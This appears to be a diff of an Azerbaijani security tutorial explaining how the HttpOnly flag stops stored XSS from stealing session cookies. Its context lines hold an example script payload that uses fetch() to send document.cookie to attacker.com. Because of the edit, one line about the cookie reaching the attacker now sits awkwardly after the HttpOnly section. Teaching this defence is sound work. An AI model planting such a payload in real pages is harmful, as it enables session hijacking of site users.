@@ -45,12 +45,22 @@ Hücumçu stored XSS yerləşdirir:
 
 ```<script>
 fetch("https://attacker.com/?c=" + document.cookie)
-</script>```
-
+</script>
+```
 
 Admin/user səhifəni açır
 
 Brauzer session cookie-ni JS-ə verir
+
+**HttpOnly VARSA**
+
+Eyni stored XSS işləyir
+
+document.cookie → SESSION GÖRÜNMÜR
+
+Hücumçu cookie-ni oğurlaya bilmir
+
+Session təhlükəsiz qalır
 
 Cookie hücumçuya gedir
 
